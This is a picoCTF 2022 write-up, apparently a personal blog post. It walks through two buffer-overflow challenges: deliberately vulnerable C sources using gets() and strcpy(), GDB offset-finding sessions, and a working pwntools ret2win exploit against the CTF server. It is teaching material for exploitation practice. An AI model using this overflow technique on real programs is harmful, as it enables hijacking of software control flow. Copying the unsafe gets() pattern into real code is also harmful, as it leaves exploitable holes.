---
title: "pico22/pwn: Buffer overflow series"
date: 2022-06-06 12:16:08
categories:
- ctfs
- pico22
- pwn
tags:
- pwn
- buffer-overflow
description: "Learn how to exploit vulnerable C functions to break the program, eventually controlling the flow of code execution! This is a writeup for the picoCTF 2022 binary/pwn series \"Buffer overflow\"."
permalink: ctfs/pico22/pwn/buffer-overflow-series/
thumbnail: /asset/banner/banner-buffer-overflow.png
---

<script src="https://kit.fontawesome.com/129342a70b.js" crossorigin="anonymous"></script>

<style>
    .box {
        border: 1px solid rgb(23, 25, 27);
        border-radius: 5px;
        background-color: rgb(23, 25, 27);
        padding: 1rem;
        font-size: 90%;
        text-align: center;
        margin-top: 1rem;
        margin-bottom: 1rem;
    }

    .warning {
        border: 1px solid #481219;
        border-radius: 5px;
        background-color: #481219;
        padding: 1rem;
        font-size: 90%;
        text-align: center;
    }

    .no-highlight {
        user-select: none;
        -moz-user-select: none;
        -webkit-user-select: none;
        -ms-user-select: none;
    }
</style>

### Intro

This is a writeup for the buffer overflow series during the **picoCTF 2022** competition. This was arguably my favorite set of challenges, as beforehand I'd never stepped into the realm of binary exploitation/pwn. I learned a lot from this, so I highly recommend solving it by yourself before referencing this document. Cheers!

## Buffer overflow 0

<div class="box no-highlight">
  Smash the stack! Let's start off simple: can you overflow the correct buffer? The program is available <a href="/asset/pico/buffer-overflow-0-1/vuln-0">here</a>. You can view source <a href="/asset/pico/buffer-overflow-0-1/vuln-0.c">here</a>, and connect with it using:<br><code>nc saturn.picoctf.net 65535</code><br><br><b>Authors</b>: Alex Fulton, Palash Oswal
  <details><summary><b>Hints:</b></summary><br>1. How can you trigger the flag to print?<br>2. If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.<br>3. Run <code>man gets</code> and read the BUGS section. How many characters can the program really read?</details>
</div>

<figure class="highlight console">
  <figcaption><span>checksec.sh</span><a target="_blank" rel="noopener"
      href="https://github.com/slimm609/checksec.sh"><span style="color:#82C4E4">github link</span></a></figcaption>
  <table>
    <tr>
      <td class="code">
        <pre><span class="meta prompt_">$ </span> checksec vuln
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-0/vuln&apos;
    Arch:     i386-32-little
    RELRO:    <span style="color:#5EBDAB">Full RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#5EBDAB">NX enabled</span>
    PIE:      <span style="color:#5EBDAB">PIE enabled</span>
</pre>
      </td>
    </tr>
  </table>
</figure>


Let's analyze this `.c` file we have as reference:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}

```

The first thing we should do is check how the flag is printed. Looks like it's handled in a `sigsegv_handler()` function:

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
/* ... */
signal(SIGSEGV, sigsegv_handler);
```

Researching online, a "SIGSEGV" stands for a **segmentation fault**, which is an error raised by memory-protected hardware whenever it tries to access a memory address that is either restricted or does not exist. If the flag `printf()` resides within `sigsegv_handler()`, then we can safely assume that we must figure out how to trigger a segmentation fault.

We see that on line 40, the horrible `gets()` is called, and reads `buf1` (the user input) onto the stack. This function sucks, as it will write the user's input to the stack without regard to its allocated length. The user can simply overflow this length, and the program will pass their input into the `vuln()` function to trigger a segmentation fault:

<figure class="highlight console">
  <table>
    <tr>
      <td class="code">
        <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc saturn.picoctf.net 65535</span></span><br><span class="line">Input: aaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">picoCTF{ov3rfl0ws_ar3nt_that_bad_<span style="color:#696969"><b>[REDACTED]</b></span>}</span><br></pre>
      </td>
    </tr>
  </table>
</figure>


---

## Buffer overflow 1

<div class="box no-highlight">
  Control the return address.<br>
  Now we're cooking! You can overflow the buffer and return to the flag function in the <a href="/asset/pico/buffer-overflow-0-1/vuln-1">program</a>. You can view source <a href="/asset/pico/buffer-overflow-0-1/vuln-1.c">here</a>. And connect with it using:<br> <code>nc saturn.picoctf.net [PORT]</code><br><br>
  <b>Authors</b>: Sanjay C., Palash Oswal
  <details><summary><b>Hints:</b></summary><br>1. Make sure you consider big Endian vs small Endian.<br>2. Changing the address of the return pointer can call different functions.</details>
</div>

<div class="warning">
<i class="fa-solid fa-triangle-exclamation"></i> Warning: This is an <b>instance-based</b> challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.
</div>

<figure class="highlight console">
  <figcaption><span>checksec.sh</span><a target="_blank" rel="noopener"
      href="https://github.com/slimm609/checksec.sh"><span style="color:#82C4E4">github link</span></a></figcaption>
<table><tr><td class="code"><pre><span class="meta prompt_">$ </span>checksec vuln
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-1/vuln&apos;
    Arch:     i386-32-little
    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#D41919">NX disabled</span>
    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
    RWX:      <span style="color:#D41919">Has RWX segments</span>
</pre></td></tr></table></figure>

Let's check out our source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

In the `vuln()` function, we see that once again, the `gets()` function is being used. However, instead of triggering a segmentation fault like <kbd>Buffer overflow 0</kbd>, we will instead utilize its vulnerability to write our own addresses onto the stack, changing the return address to `win()` instead.

### Part I: Explaining the Stack

Before we get into the code, we need to figure out how to write our own addresses to the stack. Let's start with a visual:

![Stack Visualization](/asset/pico/buffer-overflow-0-1/stack-visual.png)

Whenever we call a function, multiple items will be "pushed" onto the **top** of the stack (in the diagram, that will be on the right-most side). It will include any parameters, a return address back to `main()`, a base pointer, and a buffer. Note that the stack grows **downwards**, towards lower memory addresses, but the buffer is written **upwards**, towards higher memory addresses.

We can "smash the stack" by exploiting the `gets()` function. If we pass in a large enough input, it will overwrite the entire buffer and start overflowing into the base pointer and return address within the stack:

![Overflow Visualization](/asset/pico/buffer-overflow-0-1/overflow-visual.png)

If we are delibrate of the characters we pass into `gets()`, we will be able to insert a new address to overwrite the return address to `win()`. Let's try!

### Part II: Smashing the Stack

To start, we first need to figure out our "offset". The offset is the distance, in characters, between the beginning of the buffer and the position of the `$eip`. This can be visualized with the `gdb-gef` utility by setting a breakpoint (a place to pause the runtime) in the `main()` function:

<figure class="highlight text">
  <figcaption><span>GEF - "GDB enhanced features"</span><a target="_blank" rel="noopener"
      href="https://gef.readthedocs.io/en/master/"><span style="color:#82C4E4">documentation</span></a></figcaption>
<table><tr><td class="code"><pre><span style="color:#EC0101"><b>gef➤  </b></span>b main
Breakpoint 1 at <span style="color:#367BF0">0x80492d7</span>
<span style="color:#EC0101"><b>gef➤  </b></span>r
Starting program: /home/kali/ctfs/pico22/buffer-overflow-1/vuln 
Breakpoint 1, <span style="color:#367BF0">0x080492d7</span> in <span style="color:#FEA44C">main</span> ()
[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>$eax   </b></span>: 0xf7fa39e8  →  <span style="color:#9755B3">0xffffd20c</span>  →  <span style="color:#9755B3">0xffffd3d1</span>  →  <span style="color:#FEA44C">"SHELL=/usr/bin/bash"</span>
<span style="color:#367BF0">$ebx   </span>: 0x0       
<span style="color:#EC0101"><b>$ecx   </b></span>: <span style="color:#9755B3">0xffffd160</span>  →  0x00000001
<span style="color:#EC0101"><b>$edx   </b></span>: <span style="color:#9755B3">0xffffd194</span>  →  0x00000000
<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd140</span>  →  <span style="color:#9755B3">0xffffd160</span>  →  0x00000001
<span style="color:#EC0101"><b>$ebp   </b></span>: <span style="color:#9755B3">0xffffd148</span>  →  0x00000000
<span style="color:#EC0101"><b>$esi   </b></span>: 0x1       
<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80490e0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; endbr32 </b></span>
<span style="color:#EC0101"><b>$eip   </b></span>: <span style="color:#D41919">0x80492d7</span>  →  <span style="color:#585858"><b>&lt;main+19&gt; sub esp, 0x10</b></span>
<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
   <span style="color:#585858"><b> 0x80492d3 &lt;main+15&gt;        mov    ebp, esp</b></span>
   <span style="color:#585858"><b> 0x80492d5 &lt;main+17&gt;        push   ebx</b></span>
   <span style="color:#585858"><b> 0x80492d6 &lt;main+18&gt;        push   ecx</b></span>
 <span style="color:#5EBDAB">→  0x80492d7 &lt;main+19&gt;        sub    esp, 0x10</span>
    0x80492da &lt;main+22&gt;        call   0x8049130 &lt;__x86.get_pc_thunk.bx&gt;
    0x80492df &lt;main+27&gt;        add    ebx, 0x2d21
    0x80492e5 &lt;main+33&gt;        mov    eax, DWORD PTR [ebx-0x4]
    0x80492eb &lt;main+39&gt;        mov    eax, DWORD PTR [eax]
    0x80492ed &lt;main+41&gt;        push   0x0
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: "vuln", <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x80492d7</span> in <span style="color:#FF8A18"><b>main</b></span> (), reason: <span style="color:#962AC3"><b>BREAKPOINT</b></span></pre></td></tr></table></figure>

Analyzing this breakpoint, if you look at the arrow on the assembly code, you can see that its address is the exact same as the `$eip` (`0x80492d7`). Let's try overflowing this register by passing an unhealthy amount of `A`s into the program:

<figure class="highlight text"><table> <tr><td class="code"><pre><span style="color:#47D4B9"><b>gef➤  </b></span>r
Starting program: /home/kali/ctfs/pico22/buffer-overflow-1/vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Okay, time to return... Fingers Crossed... Jumping to 0x41414141

Program received signal SIGSEGV, Segmentation fault.
<span style="color:#367BF0">0x41414141</span> in <span style="color:#FEA44C">??</span> ()
[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>$eax   </b></span>: 0x41      
<span style="color:#EC0101"><b>$ebx   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
<span style="color:#EC0101"><b>$ecx   </b></span>: 0x41      
<span style="color:#EC0101"><b>$edx   </b></span>: 0xffffffff
<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd130</span>  →  <span style="color:#FEA44C">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
<span style="color:#EC0101"><b>$ebp   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
<span style="color:#EC0101"><b>$esi   </b></span>: 0x1       
<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80490e0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; endbr32 </b></span>
<span style="color:#EC0101"><b>$eip   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>[!]</b></span> Cannot disassemble from $PC
<span style="color:#EC0101"><b>[!]</b></span> Cannot access memory at address 0x41414141
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: "vuln", <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x41414141</span> in <span style="color:#FF8A18"><b>??</b></span> (), reason: <span style="color:#962AC3"><b>SIGSEGV</b></span></pre></td></tr></table></figure>

<div style="margin-top:-2.5%; margin-bottom:2.5%;">Look what happened: our program threw a SIGSEGV (segmentation) fault, as it is trying to reference the address <code>0x41414141</code>, which doesn&#39;t exist! This is because our <code>$eip</code> was overwritten by all our <code>A</code>s (<code>0x41</code> in hex = <code>A</code> in ASCII).</div>

### Part III: Smashing the Stack (with finesse)

Although we've managed to smash the stack, we still dont' know the offset (**how many** `A`s we need to pass in order to reach the `$eip`). To solve this problem, we can use the pwntools `cyclic` command, which creates a string with a recognizable cycling pattern for it to identify:

<figure class="highlight text"><table><tr><td class="code"><pre><span style="color:#47D4B9"><b>gef➤  </b></span>shell cyclic 48
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
<span style="color:#47D4B9"><b>gef➤  </b></span>r
Starting program: /home/kali/ctfs/pico22/buffer-overflow-1/vuln 
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

Program received signal SIGSEGV, Segmentation fault.
<span style="color:#367BF0">0x6161616c</span> in <span style="color:#FEA44C">??</span> ()
[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>$eax   </b></span>: 0x41      
<span style="color:#EC0101"><b>$ebx   </b></span>: 0x6161616a (&quot;<span style="color:#FEA44C">jaaa</span>&quot;?)
<span style="color:#EC0101"><b>$ecx   </b></span>: 0x41      
<span style="color:#EC0101"><b>$edx   </b></span>: 0xffffffff
<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd130</span>  →  0x00000000
<span style="color:#EC0101"><b>$ebp   </b></span>: 0x6161616b (&quot;<span style="color:#FEA44C">kaaa</span>&quot;?)
<span style="color:#EC0101"><b>$esi   </b></span>: 0x1       
<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80490e0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; endbr32 </b></span>
<span style="color:#EC0101"><b>$eip   </b></span>: 0x6161616c (&quot;<span style="color:#FEA44C">laaa</span>&quot;?)
<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>[!]</b></span> Cannot disassemble from $PC
<span style="color:#EC0101"><b>[!]</b></span> Cannot access memory at address 0x6161616c
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: &quot;vuln&quot;, <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x6161616c</span> in <span style="color:#FF8A18"><b>??</b></span> (), reason: <span style="color:#962AC3"><b>SIGSEGV</b></span>
</pre></td></tr></table></figure>

<div style="margin-top:-2.5%; margin-bottom:2.5%">We can see that <code>$eip</code> is currently overflowed with the pattern <code>0x6161616c</code> (<code>laaa</code>). let&#39;s search for this pattern using <code>pattern search</code>:</div>

<figure class="highlight plaintext">
  <figcaption><span>GEF pattern command</span><a target="_blank" rel="noopener"
      href="https://gef.readthedocs.io/en/master/commands/pattern/"><span style="color:#82C4E4">documentation</span></a></figcaption>
  <table>
    <tr>
      <td class="code">
        <pre><span style="color:#47D4B9"><b>gef➤  </b></span>pattern search 0x6161616c
<span style="color:#277FFF"><b>[+]</b></span> Searching for &apos;0x6161616c&apos;
<span style="color:#47D4B9"><b>[+]</b></span> Found at offset 44 (little-endian search) <span style="color:#EC0101"><b>likely</b></span>
<span style="color:#47D4B9"><b>[+]</b></span> Found at offset 41 (big-endian search) 
</pre>
      </td>
    </tr>
  </table>
</figure>


To figure out which offset we need to use, we can use `readelf` to analyze header of the `vuln` executable:

<figure class="highlight console">
  <figcaption><span>readelf command</span><a target="_blank" rel="noopener"
      href="https://man7.org/linux/man-pages/man1/readelf.1.html"><span style="color:#82C4E4">documentation</span></a></figcaption>
  <table>
    <tr>
      <td class="code">
        <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">readelf -h vuln | grep endian</span></span><br><span class="line">  Data: 2&#x27;s complement, little endian</span><br></pre>
      </td>
    </tr>
  </table>
</figure>


Our binary is in little endian, we know that 44 `A`s are needed in order to reach the `$eip`. The only thing we need now before we create our exploit is the address of the `win()` function, which will be appended to the end of our buffer to overwrite the `$eip` on the stack:

<figure class="highlight text">
  <figcaption><span>GDB x command</span><a target="_blank" rel="noopener"
      href="https://visualgdb.com/gdbreference/commands/x"><span style="color:#82C4E4">documentation</span></a></figcaption>
  <table>
    <tr>
      <td class="code">
<pre><span style="color:#47D4B9"><b>gef➤  </b></span>x win
<span style="color:#367BF0">0x80491f6</span> &lt;<span style="color:#FEA44C">win</span>&gt;:	0xfb1e0ff3
</pre>      </td>
    </tr>
  </table>
</figure>


Win is at `0x80491f6`, but we need to convert it to the little endian format. You can do this with the pwntools `p32()` command, which results in `\xf6\x91\x04\x08`.
Let's make a final visual of our payload:

![Payload Visual](/asset/pico/buffer-overflow-0-1/payload-visual.png)

Let's write our payload and send it to the remote server with Python3/pwntools:

<figure class="highlight py">
  <figcaption><span>buffer-overflow-1.py</span><a target="_blank" rel="noopener"
      href="https://gist.github.com/jktrn/23ec53b007e3589c6793acffce207394"><span style="color:#82C4E4">github gist link</span></a></figcaption>
  <table><tr><td class="gutter">
        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
      </td>
      <td class="code">
        <pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">44</span> + p32(<span class="number">0x80491f6</span>)  <span class="comment"># Little endian: b&#x27;\xf6\x91\x04\x08&#x27;</span></span><br><span class="line">host, port = <span class="string">&quot;saturn.picoctf.net&quot;</span>, [PORT]</span><br><span class="line"></span><br><span class="line">p = remote(host, port)      <span class="comment"># Opens the connection</span></span><br><span class="line">log.info(p.recvS())         <span class="comment"># Decodes/prints &quot;Please enter your string:&quot;</span></span><br><span class="line">p.sendline(payload)         <span class="comment"># Sends the payload</span></span><br><span class="line">log.success(p.recvallS())   <span class="comment"># Decodes/prints all program outputs</span></span><br><span class="line">p.close()                   <span class="comment"># Closes the connection</span></span><br></pre>
</td></tr></table></figure>

Let's try running the script on the server:

<figure class="highlight text"><table><tr><td class="code">
<pre><span class="meta prompt_">$ </span>python3 exp2.py
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
[<span style="color:#277FFF"><b>*</b></span>] Please enter your string: 
[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (100B)
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to saturn.picoctf.net port <span style="color:#696969"><b>[PORT]</b></span>
[<span style="color:#47D4B9"><b>+</b></span>] Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
    picoCTF{addr3ss3s_ar3_3asy_<span style="color:#696969"><b>[REDACTED]</b></span>}
</pre></td></tr></table></figure>


You have completed your first `ret2win` buffer overflow on a x32 binary!

<a href="https://info.flagcounter.com/8Xkk"><img src="https://s01.flagcounter.com/count2/8Xkk/bg_212326/txt_C9CACC/border_C9CACC/columns_3/maxflags_12/viewers_3/labels_0/pageviews_1/flags_1/percent_0/" alt="Free counters!" border="0"></a>
